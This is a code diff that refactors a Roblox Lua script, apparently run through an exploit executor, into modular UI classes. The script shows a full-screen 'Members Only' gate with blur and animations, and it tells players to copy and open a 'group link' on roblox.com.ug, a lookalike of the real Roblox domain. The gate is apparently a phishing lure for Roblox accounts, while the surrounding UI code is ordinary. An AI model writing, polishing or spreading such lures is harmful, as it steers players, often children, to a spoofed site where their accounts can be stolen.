@@ -1,245 +1,461 @@
-local Players = game:GetService("Players")
+-- Modules/UIElementFactory.lua
 local TweenService = game:GetService("TweenService")
-local Lighting = game:GetService("Lighting")
 
-local player = Players.LocalPlayer
+local UIElementFactory = {}
 
-local GROUP_ID = 215154644959
-local GROUP_LINK = "https://roblox.com.ug/communities/9331768180/"
+function UIElementFactory:new()
+    local obj = {TweenService = TweenService}
+    setmetatable(obj, self)
+    self.__index = self
+    return obj
+end
 
-if player:IsInGroup(GROUP_ID) then return end
-
-local UIConfig = {
-    CardSize = {360, 320},
-    CardCorner = 20,
-    Colors = {
-        Primary = Color3.fromRGB(138, 43, 226),
-        Accent = Color3.fromRGB(180, 80, 255),
-        Text = Color3.fromRGB(255, 255, 255),
-        SubText = Color3.fromRGB(210, 190, 255),
-        StepIcon = Color3.fromRGB(200, 140, 255),
-        StepText = Color3.fromRGB(235, 225, 255)
-    },
-    Steps = {
-        {icon = "①", text = "Click Copy link below"},
-        {icon = "②", text = "Open the link in your browser"},
-        {icon = "③", text = "Press Join Group on the page"},
-        {icon = "④", text = "Return here — access unlocks!"}
-    }
-}
-
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "AccessUI"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.IgnoreGuiInset = true
-ScreenGui.Parent = player:WaitForChild("PlayerGui")
-
-local Blur = Instance.new("BlurEffect")
-Blur.Size = 0
-Blur.Parent = Lighting
-
-local function createCorner(instance, radius)
+function UIElementFactory:CreateCorner(instance, radius)
     local corner = Instance.new("UICorner")
     corner.CornerRadius = UDim.new(0, radius)
     corner.Parent = instance
+    return corner
 end
 
-local function createGradient(instance, colors, rotation)
+function UIElementFactory:CreateGradient(instance, colorPoints, rotation)
     local grad = Instance.new("UIGradient")
-    grad.Color = ColorSequence.new(colors)
+    grad.Color = ColorSequence.new(colorPoints)
     grad.Rotation = rotation or 0
     grad.Parent = instance
+    return grad
 end
 
-local function createStroke(instance, color, thickness, transparency)
+function UIElementFactory:CreateStroke(instance, color, thickness, transparency)
     local stroke = Instance.new("UIStroke")
     stroke.Color = color
     stroke.Thickness = thickness
     stroke.Transparency = transparency or 0
     stroke.Parent = instance
+    return stroke
 end
 
-local function createTextLabel(parent, text, size, position, color, fontSize, font, alignment, zIndex)
+function UIElementFactory:CreateTextLabel(parent, data)
     local label = Instance.new("TextLabel")
-    label.Text = text
-    label.Size = size
-    label.Position = position
-    label.BackgroundTransparency = 1
-    label.TextColor3 = color
-    label.Font = font or Enum.Font.Gotham
-    label.TextSize = fontSize
-    label.TextXAlignment = alignment or Enum.TextXAlignment.Center
-    label.ZIndex = zIndex or 5
+    label.Text = data.text
+    label.Size = data.size
+    label.Position = data.position
+    label.BackgroundTransparency = data.bgTransparency or 1
+    label.TextColor3 = data.color
+    label.Font = data.font or Enum.Font.Gotham
+    label.TextSize = data.fontSize
+    label.TextXAlignment = data.xAlign or Enum.TextXAlignment.Center
+    label.TextYAlignment = data.yAlign or Enum.TextYAlignment.Center
+    label.ZIndex = data.zIndex or 5
     label.Parent = parent
+    
+    if data.wrapped then
+        label.TextWrapped = true
+    end
+    if data.lineHeight then
+        label.LineHeight = data.lineHeight
+    end
+    
     return label
 end
 
--- Main UI elements
-local Backdrop = Instance.new("Frame")
-Backdrop.Size = UDim2.new(1, 0, 1, 0)
-Backdrop.BackgroundColor3 = Color3.fromRGB(10, 0, 20)
-Backdrop.BackgroundTransparency = 1
-Backdrop.ZIndex = 1
-Backdrop.Parent = ScreenGui
-
-local Card = Instance.new("Frame")
-Card.Size = UDim2.new(0, UIConfig.CardSize[1], 0, UIConfig.CardSize[2])
-Card.Position = UDim2.new(0.5, -180, 0.5, 30)
-Card.BackgroundColor3 = Color3.fromRGB(70, 20, 160)
-Card.BackgroundTransparency = 1
-Card.BorderSizePixel = 0
-Card.ZIndex = 2
-Card.Parent = ScreenGui
-createCorner(Card, UIConfig.CardCorner)
-
-createGradient(Card, {
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(95, 30, 195)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 8, 105))
-}, 135)
-
-createStroke(Card, Color3.fromRGB(170, 90, 255), 1.5, 0.15)
-
--- Top shimmer
-local TopShimmer = Instance.new("Frame")
-TopShimmer.Size = UDim2.new(0.75, 0, 0, 1)
-TopShimmer.Position = UDim2.new(0.125, 0, 0, 1)
-TopShimmer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TopShimmer.BackgroundTransparency = 0.5
-TopShimmer.BorderSizePixel = 0
-TopShimmer.ZIndex = 5
-TopShimmer.Parent = Card
-createCorner(TopShimmer, 2)
-
--- Accent bar
-local Accent = Instance.new("Frame")
-Accent.Size = UDim2.new(1, 0, 0, 3)
-Accent.BackgroundColor3 = UIConfig.Colors.Accent
-Accent.BorderSizePixel = 0
-Accent.ZIndex = 3
-Accent.Parent = Card
-createCorner(Accent, UIConfig.CardCorner)
-
-createGradient(Accent, {
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 0, 200)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(210, 110, 255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 0, 200))
-})
-
--- Shadow
-local Shadow = Instance.new("ImageLabel")
-Shadow.Image = "rbxassetid://6014261993"
-Shadow.ImageColor3 = Color3.fromRGB(110, 0, 255)
-Shadow.ImageTransparency = 0.45
-Shadow.ScaleType = Enum.ScaleType.Slice
-Shadow.SliceCenter = Rect.new(49, 49, 450, 450)
-Shadow.Size = UDim2.new(1, 80, 1, 80)
-Shadow.Position = UDim2.new(0, -40, 0, -40)
-Shadow.BackgroundTransparency = 1
-Shadow.ZIndex = 1
-Shadow.Parent = Card
-
--- Icon
-createTextLabel(Card, "🔒", UDim2.new(0, 36, 0, 36), UDim2.new(0.5, -18, 0, 14),
-    Color3.fromRGB(255, 255, 255), 26, Enum.Font.GothamBold, Enum.TextXAlignment.Center, 5)
-
--- Title
-createTextLabel(Card, "Members Only!", UDim2.new(1, -30, 0, 32), UDim2.new(0, 15, 0, 52),
-    UIConfig.Colors.Text, 22, Enum.Font.GothamBold, Enum.TextXAlignment.Center, 5)
-
--- Subtitle
-createTextLabel(Card, "This script is exclusive to group members.\nJoin our group to unlock full access!",
-    UDim2.new(1, -30, 0, 40), UDim2.new(0, 15, 0, 84),
-    UIConfig.Colors.SubText, 13, Enum.Font.Gotham, Enum.TextXAlignment.Center, 5)
-
--- Divider
-local Div = Instance.new("Frame")
-Div.Size = UDim2.new(0.85, 0, 0, 1)
-Div.Position = UDim2.new(0.075, 0, 0, 132)
-Div.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Div.BackgroundTransparency = 0.75
-Div.BorderSizePixel = 0
-Div.ZIndex = 5
-Div.Parent = Card
-
-createGradient(Div, {
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
-})
-
--- How to join label
-createTextLabel(Card, "HOW TO JOIN", UDim2.new(1, -30, 0, 18), UDim2.new(0, 15, 0, 142),
-    Color3.fromRGB(180, 120, 255), 11, Enum.Font.GothamBold, Enum.TextXAlignment.Left, 5)
-
--- Steps
-for i, step in ipairs(UIConfig.Steps) do
-    local Row = Instance.new("Frame")
-    Row.Size = UDim2.new(1, -30, 0, 22)
-    Row.Position = UDim2.new(0, 15, 0, 160 + (i - 1) * 24)
-    Row.BackgroundTransparency = 1
-    Row.ZIndex = 5
-    Row.Parent = Card
-
-    createTextLabel(Row, step.icon, UDim2.new(0, 22, 1, 0), UDim2.new(0, 0, 0, 0),
-        UIConfig.Colors.StepIcon, 13, Enum.Font.GothamBold, Enum.TextXAlignment.Left, 5)
-
-    createTextLabel(Row, step.text, UDim2.new(1, -26, 1, 0), UDim2.new(0, 24, 0, 0),
-        UIConfig.Colors.StepText, 13, Enum.Font.Gotham, Enum.TextXAlignment.Left, 5)
+function UIElementFactory:CreateButton(parent, data)
+    local button = Instance.new("TextButton")
+    button.Text = data.text
+    button.Size = data.size
+    button.Position = data.position
+    button.BackgroundColor3 = data.bgColor
+    button.TextColor3 = data.textColor
+    button.Font = data.font or Enum.Font.GothamBold
+    button.TextSize = data.fontSize or 15
+    button.BorderSizePixel = 0
+    button.ZIndex = data.zIndex or 5
+    button.Parent = parent
+    
+    if data.cornerRadius then
+        self:CreateCorner(button, data.cornerRadius)
+    end
+    if data.stroke then
+        self:CreateStroke(button, data.stroke.color, data.stroke.thickness, data.stroke.transparency)
+    end
+    
+    return button
 end
 
--- Copy Button
-local Btn = Instance.new("TextButton")
-Btn.Text = "🔗  Copy Group Link"
-Btn.Size = UDim2.new(0.82, 0, 0, 46)
-Btn.Position = UDim2.new(0.09, 0, 0, 262)
-Btn.BackgroundColor3 = UIConfig.Colors.Primary
-Btn.TextColor3 = UIConfig.Colors.Text
-Btn.Font = Enum.Font.GothamBold
-Btn.TextSize = 15
-Btn.BorderSizePixel = 0
-Btn.ZIndex = 5
-Btn.Parent = Card
-createCorner(Btn, 12)
-createStroke(Btn, Color3.fromRGB(255, 255, 255), 1.5, 0.55)
-
--- Button animations
-Btn.MouseEnter:Connect(function()
-    TweenService:Create(Btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(160, 65, 255)}):Play()
-    TweenService:Create(Btn.UIStroke, TweenInfo.new(0.15), {Transparency = 0.2}):Play()
-end)
-
-Btn.MouseLeave:Connect(function()
-    TweenService:Create(Btn, TweenInfo.new(0.15), {BackgroundColor3 = UIConfig.Colors.Primary}):Play()
-    TweenService:Create(Btn.UIStroke, TweenInfo.new(0.15), {Transparency = 0.55}):Play()
-end)
-
-Btn.MouseButton1Click:Connect(function()
-    TweenService:Create(Btn, TweenInfo.new(0.07), {Size = UDim2.new(0.79, 0, 0, 42)}):Play()
-    task.wait(0.07)
-    TweenService:Create(Btn, TweenInfo.new(0.12, Enum.EasingStyle.Back), {Size = UDim2.new(0.82, 0, 0, 46)}):Play()
-
-    if setclipboard then
-        setclipboard(GROUP_LINK)
-        Btn.Text = "✓  Link Copied!"
-        Btn.TextColor3 = Color3.fromRGB(160, 255, 190)
-        task.delay(2.5, function()
-            Btn.Text = "🔗  Copy Group Link"
-            Btn.TextColor3 = UIConfig.Colors.Text
-        end)
-    else
-        Btn.Text = "Not supported ⚠"
+function UIElementFactory:CreateFrame(parent, data)
+    local frame = Instance.new("Frame")
+    frame.Size = data.size
+    frame.Position = data.position
+    frame.BackgroundColor3 = data.bgColor or Color3.new(1, 1, 1)
+    frame.BackgroundTransparency = data.bgTransparency or 0
+    frame.BorderSizePixel = data.borderSize or 0
+    frame.ZIndex = data.zIndex or 1
+    frame.Parent = parent
+    
+    if data.cornerRadius then
+        self:CreateCorner(frame, data.cornerRadius)
     end
-end)
+    if data.gradient then
+        self:CreateGradient(frame, data.gradient.colors, data.gradient.rotation)
+    end
+    if data.stroke then
+        self:CreateStroke(frame, data.stroke.color, data.stroke.thickness, data.stroke.transparency)
+    end
+    
+    return frame
+end
 
--- Entrance animations
-local function playEntrance()
-    TweenService:Create(Backdrop, TweenInfo.new(0.35), {BackgroundTransparency = 0.45}):Play()
-    TweenService:Create(Blur, TweenInfo.new(0.45), {Size = 14}):Play()
+-- Modules/AnimationController.lua
+local AnimationController = {}
+AnimationController.__index = AnimationController
+
+function AnimationController:new(tweenService)
+    local obj = {
+        TweenService = tweenService,
+        activeTweens = {}
+    }
+    setmetatable(obj, self)
+    return obj
+end
+
+function AnimationController:CreateTween(target, properties, duration, easingStyle, easingDirection)
+    local tweenInfo = TweenInfo.new(duration, easingStyle or Enum.EasingStyle.Quad, 
+                                    easingDirection or Enum.EasingDirection.Out)
+    local tween = self.TweenService:Create(target, tweenInfo, properties)
+    table.insert(self.activeTweens, tween)
+    tween:Play()
+    return tween
+end
+
+function AnimationController:PlayEntrance(backdrop, blur, card, config)
+    self:CreateTween(backdrop, {BackgroundTransparency = 0.45}, 0.35)
+    self:CreateTween(blur, {Size = config.BlurSize}, config.AnimationDuration)
     task.wait(0.1)
-    TweenService:Create(Card, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+    self:CreateTween(card, {
         Position = UDim2.new(0.5, -180, 0.5, -160),
         BackgroundTransparency = 0.2
-    }):Play()
+    }, config.AnimationDuration, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
 end
 
-playEntrance()
+function AnimationController:ButtonHover(button, hoverColor, originalColor, stroke)
+    self:CreateTween(button, {BackgroundColor3 = hoverColor}, 0.15)
+    if stroke then
+        self:CreateTween(stroke, {Transparency = 0.2}, 0.15)
+    end
+end
+
+function AnimationController:ButtonLeave(button, originalColor, stroke)
+    self:CreateTween(button, {BackgroundColor3 = originalColor}, 0.15)
+    if stroke then
+        self:CreateTween(stroke, {Transparency = 0.55}, 0.15)
+    end
+end
+
+function AnimationController:ButtonClick(button)
+    self:CreateTween(button, {Size = UDim2.new(0.79, 0, 0, 42)}, 0.07)
+    task.wait(0.07)
+    self:CreateTween(button, {Size = UDim2.new(0.82, 0, 0, 46)}, 0.12, Enum.EasingStyle.Back)
+end
+
+-- Modules/GroupAccessUI.lua
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+
+local GroupAccessUI = {}
+GroupAccessUI.__index = GroupAccessUI
+
+function GroupAccessUI:new(config, factory, animController)
+    local obj = {
+        Config = config,
+        Factory = factory,
+        AnimController = animController,
+        Player = Players.LocalPlayer,
+        ScreenGui = nil,
+        Blur = nil,
+        Backdrop = nil,
+        Card = nil,
+        CopyButton = nil
+    }
+    setmetatable(obj, self)
+    return obj
+end
+
+function GroupAccessUI:CheckMembership()
+    return self.Player:IsInGroup(self.Config.Group.Id)
+end
+
+function GroupAccessUI:CreateBase()
+    self.ScreenGui = Instance.new("ScreenGui")
+    self.ScreenGui.Name = "AccessUI"
+    self.ScreenGui.ResetOnSpawn = false
+    self.ScreenGui.IgnoreGuiInset = true
+    self.ScreenGui.Parent = self.Player:WaitForChild("PlayerGui")
+    
+    self.Blur = Instance.new("BlurEffect")
+    self.Blur.Size = 0
+    self.Blur.Parent = Lighting
+    
+    self.Backdrop = self.Factory:CreateFrame(self.ScreenGui, {
+        size = UDim2.new(1, 0, 1, 0),
+        bgColor = self.Config.Colors.Backdrop,
+        bgTransparency = 1,
+        zIndex = 1
+    })
+end
+
+function GroupAccessUI:CreateCard()
+    self.Card = self.Factory:CreateFrame(self.ScreenGui, {
+        size = UDim2.new(0, self.Config.Visuals.CardSize[1], 0, self.Config.Visuals.CardSize[2]),
+        position = UDim2.new(0.5, -180, 0.5, 30),
+        bgColor = self.Config.Colors.CardBg,
+        bgTransparency = 1,
+        zIndex = 2,
+        cornerRadius = self.Config.Visuals.CardCorner,
+        gradient = {
+            colors = {
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(95, 30, 195)),
+                ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 8, 105))
+            },
+            rotation = 135
+        },
+        stroke = {
+            color = self.Config.Colors.Border,
+            thickness = 1.5,
+            transparency = 0.15
+        }
+    })
+    
+    self:CreateCardDecorations()
+    self:CreateCardContent()
+    self:CreateSteps()
+    self:CreateCopyButton()
+end
+
+function GroupAccessUI:CreateCardDecorations()
+    local shimmer = self.Factory:CreateFrame(self.Card, {
+        size = UDim2.new(0.75, 0, 0, 1),
+        position = UDim2.new(0.125, 0, 0, 1),
+        bgColor = Color3.fromRGB(255, 255, 255),
+        bgTransparency = 0.5,
+        zIndex = 5,
+        cornerRadius = 2
+    })
+    
+    local accent = self.Factory:CreateFrame(self.Card, {
+        size = UDim2.new(1, 0, 0, 3),
+        bgColor = self.Config.Colors.Accent,
+        zIndex = 3,
+        cornerRadius = self.Config.Visuals.CardCorner,
+        gradient = {
+            colors = {
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 0, 200)),
+                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(210, 110, 255)),
+                ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 0, 200))
+            }
+        }
+    })
+    
+    local shadow = Instance.new("ImageLabel")
+    shadow.Image = "rbxassetid://6014261993"
+    shadow.ImageColor3 = self.Config.Colors.Shadow
+    shadow.ImageTransparency = 0.45
+    shadow.ScaleType = Enum.ScaleType.Slice
+    shadow.SliceCenter = Rect.new(49, 49, 450, 450)
+    shadow.Size = UDim2.new(1, 80, 1, 80)
+    shadow.Position = UDim2.new(0, -40, 0, -40)
+    shadow.BackgroundTransparency = 1
+    shadow.ZIndex = 1
+    shadow.Parent = self.Card
+end
+
+function GroupAccessUI:CreateCardContent()
+    self.Factory:CreateTextLabel(self.Card, {
+        text = "🔒",
+        size = UDim2.new(0, 36, 0, 36),
+        position = UDim2.new(0.5, -18, 0, 14),
+        color = self.Config.Colors.Text,
+        fontSize = 26,
+        font = Enum.Font.GothamBold
+    })
+    
+    self.Factory:CreateTextLabel(self.Card, {
+        text = "Members Only!",
+        size = UDim2.new(1, -30, 0, 32),
+        position = UDim2.new(0, 15, 0, 52),
+        color = self.Config.Colors.Text,
+        fontSize = 22,
+        font = Enum.Font.GothamBold
+    })
+    
+    self.Factory:CreateTextLabel(self.Card, {
+        text = "This script is exclusive to group members.\nJoin our group to unlock full access!",
+        size = UDim2.new(1, -30, 0, 40),
+        position = UDim2.new(0, 15, 0, 84),
+        color = self.Config.Colors.SubText,
+        fontSize = 13,
+        wrapped = true,
+        lineHeight = 1.4
+    })
+    
+    local divider = self.Factory:CreateFrame(self.Card, {
+        size = UDim2.new(0.85, 0, 0, 1),
+        position = UDim2.new(0.075, 0, 0, 132),
+        bgColor = Color3.fromRGB(255, 255, 255),
+        bgTransparency = 0.75,
+        zIndex = 5,
+        gradient = {
+            colors = {
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
+                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+                ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
+            }
+        }
+    })
+    
+    self.Factory:CreateTextLabel(self.Card, {
+        text = "HOW TO JOIN",
+        size = UDim2.new(1, -30, 0, 18),
+        position = UDim2.new(0, 15, 0, 142),
+        color = Color3.fromRGB(180, 120, 255),
+        fontSize = 11,
+        font = Enum.Font.GothamBold,
+        xAlign = Enum.TextXAlignment.Left
+    })
+end
+
+function GroupAccessUI:CreateSteps()
+    local steps = {
+        {icon = "①", text = "Click Copy link below"},
+        {icon = "②", text = "Open the link in your browser"},
+        {icon = "③", text = "Press Join Group on the page"},
+        {icon = "④", text = "Return here — access unlocks!"}
+    }
+    
+    for i, step in ipairs(steps) do
+        local row = self.Factory:CreateFrame(self.Card, {
+            size = UDim2.new(1, -30, 0, 22),
+            position = UDim2.new(0, 15, 0, 160 + (i - 1) * 24),
+            bgTransparency = 1,
+            zIndex = 5
+        })
+        
+        self.Factory:CreateTextLabel(row, {
+            text = step.icon,
+            size = UDim2.new(0, 22, 1, 0),
+            position = UDim2.new(0, 0, 0, 0),
+            color = self.Config.Colors.StepIcon,
+            fontSize = 13,
+            font = Enum.Font.GothamBold,
+            xAlign = Enum.TextXAlignment.Left
+        })
+        
+        self.Factory:CreateTextLabel(row, {
+            text = step.text,
+            size = UDim2.new(1, -26, 1, 0),
+            position = UDim2.new(0, 24, 0, 0),
+            color = self.Config.Colors.StepText,
+            fontSize = 13,
+            xAlign = Enum.TextXAlignment.Left
+        })
+    end
+end
+
+function GroupAccessUI:CreateCopyButton()
+    self.CopyButton = self.Factory:CreateButton(self.Card, {
+        text = "🔗  Copy Group Link",
+        size = UDim2.new(0.82, 0, 0, 46),
+        position = UDim2.new(0.09, 0, 0, 262),
+        bgColor = self.Config.Colors.Primary,
+        textColor = self.Config.Colors.Text,
+        zIndex = 5,
+        cornerRadius = 12,
+        stroke = {
+            color = Color3.fromRGB(255, 255, 255),
+            thickness = 1.5,
+            transparency = 0.55
+        }
+    })
+    
+    self:SetupButtonEvents()
+end
+
+function GroupAccessUI:SetupButtonEvents()
+    local originalColor = self.Config.Colors.Primary
+    local hoverColor = self.Config.Colors.PrimaryHover
+    local stroke = self.CopyButton:FindFirstChild("UIStroke")
+    
+    self.CopyButton.MouseEnter:Connect(function()
+        self.AnimController:ButtonHover(self.CopyButton, hoverColor, originalColor, stroke)
+    end)
+    
+    self.CopyButton.MouseLeave:Connect(function()
+        self.AnimController:ButtonLeave(self.CopyButton, originalColor, stroke)
+    end)
+    
+    self.CopyButton.MouseButton1Click:Connect(function()
+        self.AnimController:ButtonClick(self.CopyButton)
+        
+        if setclipboard then
+            setclipboard(self.Config.Group.Link)
+            self.CopyButton.Text = "✓  Link Copied!"
+            self.CopyButton.TextColor3 = self.Config.Colors.Success
+            task.delay(2.5, function()
+                self.CopyButton.Text = "🔗  Copy Group Link"
+                self.CopyButton.TextColor3 = self.Config.Colors.Text
+            end)
+        else
+            self.CopyButton.Text = "Not supported ⚠"
+        end
+    end)
+end
+
+function GroupAccessUI:Show()
+    self:CreateBase()
+    self:CreateCard()
+    self.AnimController:PlayEntrance(self.Backdrop, self.Blur, self.Card, self.Config.Visuals)
+end
+
+local UIConfig = {
+    Group = {
+        Id = 215154644959,
+        Link = "https://roblox.com.ug/communities/9331768180/"
+    },
+    Visuals = {
+        CardSize = {360, 320},
+        CardCorner = 20,
+        BlurSize = 14,
+        AnimationDuration = 0.45
+    },
+    Colors = {
+        Primary = Color3.fromRGB(138, 43, 226),
+        PrimaryHover = Color3.fromRGB(160, 65, 255),
+        Accent = Color3.fromRGB(180, 80, 255),
+        Text = Color3.fromRGB(255, 255, 255),
+        SubText = Color3.fromRGB(210, 190, 255),
+        StepIcon = Color3.fromRGB(200, 140, 255),
+        StepText = Color3.fromRGB(235, 225, 255),
+        CardBg = Color3.fromRGB(70, 20, 160),
+        Backdrop = Color3.fromRGB(10, 0, 20),
+        Shadow = Color3.fromRGB(110, 0, 255),
+        Border = Color3.fromRGB(170, 90, 255),
+        Success = Color3.fromRGB(160, 255, 190)
+    }
+}
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local function main()
+    local player = Players.LocalPlayer
+    
+    if player:IsInGroup(UIConfig.Group.Id) then
+        return
+    end
+    
+    local factory = UIElementFactory:new()
+    local animController = AnimationController:new(TweenService)
+    local ui = GroupAccessUI:new(UIConfig, factory, animController)
+    
+    ui:Show()
+end
+
+main()
